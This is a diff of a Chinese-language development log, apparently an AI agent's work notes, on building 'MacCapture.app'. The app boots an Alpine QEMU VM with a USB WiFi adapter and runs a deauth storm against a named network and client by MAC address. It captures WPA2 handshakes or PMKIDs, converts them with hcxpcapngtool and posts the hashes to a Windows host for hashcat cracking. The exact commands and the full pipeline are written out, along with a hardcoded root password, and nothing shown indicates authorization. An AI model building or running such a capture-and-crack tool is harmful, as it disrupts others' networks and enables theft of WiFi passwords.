@@ -33,6 +33,41 @@ Mac 抓 EAPOL (monitor mode)  →  hcxpcapngtool  →  .hc22000 (m=22000 hash)
 - **VM 指令**（Mac 125）：`/opt/homebrew/bin/qemu-system-aarch64 -machine virt -cpu cortex-a72 -m 4096 -smp 4 -drive file=/tmp/alpine-disk.qcow2,format=qcow2 -kernel /tmp/alpine-boot/boot/vmlinuz-lts -initrd /tmp/initramfs-wifi -append 'console=ttyAMA0' -chardev socket,id=s0,path=/tmp/vm_ser.sock,server=on,wait=off -serial chardev:s0 -netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 -device virtio-net-device,netdev=n0 -device qemu-xhci,id=xhci -device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572 -display none`
 - **待做**：持久化 Alpine 到 qcow2 + 啟 sshd（port 2222 hostfwd）+ 建 **Mac GUI app**（雙擊 → 選目標 → 自動抓包 → 自動回傳 hash 給 Windows:8766）。目前抓包靠 serial + agent SSH 手動控制。
 
+## ⏱ 2026-09-13 ✅ 持久化 qcow2 獨立啟動 + 完整抓包管線二次驗證（Mac app 地基就緒）
+- **結論：qcow2 可獨立開機 + 自動設定 eth0/sshd/wifi，Mac app 只需「啟動 QEMU + SSH 進去抓包」** ✅
+- **持久化 Alpine 到 qcow2**（512M ext4，UUID b016ed7f）：96 pkgs（aircrack-ng/tcpdump/openssh/e2fsprogs/build-base/git/libpcap-dev/openssl-dev/zlib-dev）+ **手編 hcxpcapngtool 7.1.2** + ssh host keys + `/root/.ssh/authorized_keys`（vm_tongbao.pub）+ **rt2870.bin 韌體**（`/lib/firmware/`）。
+- **自製 initramfs（`/tmp/irfs-wifi/`）關鍵踩坑**：
+  - netboot initramfs 只有 `busybox/kmod/sh/ssl_client` → applet 用 `busybox --install -s`；insmod/modprobe 是 `ln -sf /bin/kmod`（kmod 靠 symlink 名偵測）。
+  - **virtio core 是 builtin**（modules.builtin 有 virtio.ko/virtio_ring.ko）→ 只 insmod virtio_pci chain + modprobe virtio_blk/virtio_net/ext4；**modprobe 自動解 modules.dep 依賴**。
+  - **QEMU 11.1 ARM virt NIC 坑**：`-device virtio-net-device`（transport-agnostic）**不上 PCI 匯流排**（`info network` 有但 `info pci` 沒有 → guest 看不到 eth0）→ 必須 **`-device virtio-net-pci,netdev=n0`**（PCI dev 1af4:1000 @ Bus 0 dev 1）。
+  - **Alpine 網路 = ifupdown-ng**（讀 `/etc/network/interfaces` Debian 格式，非 Alpine ifup 的 ifcfg-*）；**OpenRC default services 不自動啟動**（S01sshd/S10networking 有 symlink 但 boot 只跑 sysinit）→ **eth0 + sshd 直接在 /init 設定**（確定性）。
+  - **clock skew**：VM 時鐘 Jan 1 < 檔案 timestamp 2026-08-31 會讓 OpenRC 跳過 services → /init `date -s "2026-09-13 12:00:00"`（`-rtc base=host` 是錯的 QEMU 語法 → invalid datetime）。
+  - **initramfs 重打包坑**：解包會丟空目錄 → 只有 bin/etc/init/lib/sbin/usr/var（缺 proc/sys/dev/newroot）→ 重打包前 `mkdir -p /tmp/irfs-wifi/{proc,sys,dev,newroot}`，否則 `mount proc failed: No such file or directory` + MOUNT_VDA_FAILED。
+  - **af_packet 是 module**（kernel/net/packet/af_packet.ko，非 builtin，無 module 依賴）→ /init `modprobe af_packet`，否則 airodump `socket(PF_PACKET) failed: Address family not supported`。
+  - **rt2870.bin firmware**：DWA-160 (RT5592) 的 rt2800usb 需要 rt2870.bin；initramfs 有但 qcow2 /lib/firmware 空 → kernel 延遲 firmware load 從 /newroot 讀失敗（`Direct firmware load failed error -2`，wlan0 半初始化、monitor mode `SIOCSIWMODE failed: Not supported`）→ /init 把 rt2870.bin copy 到 `/newroot/lib/firmware/`（持久化），延遲 load 才成功。
+- **/init 流程**：`busybox --install -s` + insmod/modprobe symlink → 掛 proc/sys/dev + `date -s` → insmod virtio_pci chain → modprobe virtio_blk/ext4 → 等 /dev/vda + 掛 /newroot → modprobe virtio_net/xhci-pci/rt2800usb/**af_packet** → copy rt2870.bin 到 /newroot/lib/firmware → 等 eth0 → `ifconfig eth0 10.0.2.15` + route + resolv.conf → chroot chpasswd（root:alpine123）→ 啟 sshd → `switch_root /newroot /sbin/init`。
+- **實測**：qcow2 獨立開機成功（EXT4 b016ed7f mounted）；**SSH_OK_AUTO**（eth0 自動 10.0.2.15/24 + sshd listener + hostfwd 2222）；DWA-160 LOADED（rt2800usb/rt2x00usb/mac80211/cfg80211，RT chipset 5592）；`iw dev wlan0 set type monitor` **成功**；**airodump-ng -c 1 抓到 32H10F（BC:3E:07:01:DC:98, -59dBm, 55 beacons, 130Mbps, WPA2 CCMP PSK）** ✅
+- **完整管線二次驗證**：airodump 45s（BSS table 看到 32H10F）→ deauth storm（`aireplay-ng --deauth 150 --ignore-negative-one -a BC:3E:07:01:DC:98 -c BC:61:93:23:BC:3F` → 150 個 deauth 發射 + ACK）→ **hcxpcapngtool 7.1.2 讀 21290 packets**。本次 52s 窗 **0 hash**（client 走 PMKSA 快速重聯，timing 沒抓到 EAPOL/PMKID）——但管線各步驟全通；earlier `mac_vm_capture.22000` 已證 3 hash（2 PMKID + 1 新 EAPOL）。**Mac app 會跑 5-10 min 抓包提高命中。**
+- **Mac app 地基就緒**：QEMU 指令固定（`-device virtio-net-pci` + custom initramfs + qcow2 + qemu-xhci + usb-host DWA-160 + hostfwd 2222）；SSH key `~/.ssh/vm_tongbao`；capture recipe = `iw dev wlan0 set type monitor; ifconfig wlan0 up; airodump-ng -w cap -c <ch> wlan0 & aireplay-ng --deauth <N> --ignore-negative-one -a <BSSID> -c <client> wlan0; hcxpcapngtool -o cap.22000 cap-01.cap`。
+- **待做**：建 **Mac 雙擊 app**（選目標 SSID/BSSID/ch → 啟動 QEMU + 等 ~70s + SSH 抓包 + hcxpcapngtool → POST hash 給 Windows:8766）。
+
+## ⏱ 2026-09-13 ✅ Mac 雙擊 app（MacCapture.app）完成 + 完整管線驗證
+- **交付物**：`~/Desktop/MacCapture.app`（Mac 雙擊 app，Tkinter GUI）。選目標 SSID/BSSID/ch/client/duration → 自動：關閉既有 QEMU → 啟動 QEMU（qcow2 + custom initramfs + DWA-160）→ 等 95s（開機 + rt2870.bin 延遲 load）→ SSH 進 VM → monitor + **deauth storm（bg）+ airodump 迴圈（累積 capture）** → hcxpcapngtool → POST hash 給 Windows:8766。
+- **App 檔**：`C:\Users\crazydb911\Documents\deepseek\mac_capture_app.py`（~250 行）。`/tmp/mac_test_harness.py` = 測試 harness（duration=45s）。
+- **關鍵踩坑 / 解法**：
+  - **Alpine VM 無 bash**：`/bin/sh` = busybox sh → piped script 用 **`sh -s`**（非 `bash -s`）。
+  - **subprocess.run gotcha**：傳 command STRING（`VM_SSH + ' "sh -s"'`）要 **`shell=True`**，否則整串當 argv[0] → `FileNotFoundError(2)`。
+  - **rt2870.bin 延遲 load**：kernel 在 **boot 後 ~64-80s** 才延遲 load firmware（不確定）→ app 等 **95s** + wait-for-ready loop（`iw dev | grep wlan0 && dmesg | grep "Firmware detected"`）。太早跑 airodump → rx=0（wlan0 半初始化）。
+  - **/tmp 不是 tmpfs（根因！）**：qcow2 的 `/tmp` 在 `/dev/vda`（512M ext4 root）上。舊 airodump.log **172.2M** 塞滿 /tmp（477/487M = 100%, 0 avail）→ airodump 建 cap 檔（0 bytes）但寫不進 → **cap 0 bytes 即使 BSS table 看到 32H10F**。解法：VM script 開頭 `rm -f` 舊 /tmp 檔 + 結尾 `rm -f /tmp/capapp-01.*`（釋放空間）。
+  - **airodump 提前退出（exit code 0）**：airodump 用 TUI（BSS table）顯示，輸出被 redirect（非 TTY）→ TUI 壞掉（"Elapsed: 0 s" 卡住）→ **airodump 提前退出（exit 0）+ cap 變數（0-187KB）**。跟 PTY（`script`）、deauth storm、`-c` 都無關。每次只抓幾秒。
+  - **解法：airodump 迴圈**（每次提前退出，跑多次累積 capture）：`nruns=dur/10; for i in $(seq 1 $nruns); do timeout 10 airodump-ng -w /tmp/capapp -c $ch wlan0 > /dev/null 2>&1; done` → 每次建 capapp-01/02/...cap → **`ls /tmp/capapp-*.cap | xargs hcxpcapngtool -o /tmp/capapp.22000`** 處理所有 cap 檔。實測 5 次 × 8s = **5 cap 檔 / 96KB total**，hcxpcapngtool 處理 5 個 cap 檔成功。
+  - **airodump 輸出 = /dev/null**（避免 log 塞滿 /tmp）；deauth storm 背景（`nohup aireplay-ng --deauth 9999 --ignore-negative-one -a <BSSID> -c <client> wlan0 > /dev/null 2>&1 &`），airodump 迴圈後 `pkill aireplay-ng`。
+  - **VM 用 `sh -s` + `shell=True`**；`% (bssid, client, dur, ch)` format order（deauth `-a %s -c %s` + loop `nruns=$((%s/10))` + `-c %s`）。
+- **完整管線驗證**（`/tmp/mac_test_harness.py` duration=45s）：QEMU 啟動 → 等 95s → SSH → monitor + deauth storm + airodump 迴圈（4 runs）→ hcxpcapngtool **processed cap files: 4** → 0 hash（PMKSA timing，capture 無 EAPOL/PMKID 幀）→ POST 到 Windows:8766。**管線各步驟全通**；hash 命中靠 PMKSA（見 2026-09-12 的 PMKSA 鐵證：client 被 deauth 後 PMKSA 快重連，跳過完整 4-way）。
+- **Mac app 的 QEMU 指令**（Mac 125, 已固化在 app）：`/opt/homebrew/bin/qemu-system-aarch64 -machine virt -cpu cortex-a72 -m 4096 -smp 4 -drive file=/tmp/alpine-root.qcow2,format=qcow2 -kernel /tmp/alpine-boot/boot/vmlinuz-lts -initrd /tmp/initramfs-custom -append 'console=ttyAMA0' -chardev file,id=s0,path=<log>,append=on -serial chardev:s0 -netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 -device virtio-net-pci,netdev=n0 -device qemu-xhci,id=xhci -device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572 -display none -monitor unix:<sock>,server,nowait`。
+- **Mac 125 檔案**：`/tmp/alpine-root.qcow2`（512M ext4 UUID b016ed7f）、`/tmp/irfs-wifi/`（initramfs 源）、`/tmp/initramfs-custom`（~30MB）、`/tmp/mac_capture_app.py` + `~/Desktop/MacCapture.app/Contents/Resources/mac_capture_app.py`、`/tmp/mac_test_harness.py`。
+- **待做**：(a) 更長 capture（5-10 min）提高 PMKSA 命中；(b) 驗證 Windows:8766 收到 hash + hashcat 接續；(c) push GitHub。
+
 ## ⏱ 2026-09-12 EAPOL 抓包 bug 修復 + 工作中的 capture recipe (32H10F, ch1)
 
 ### 🐛 找到的 bug（關鍵）
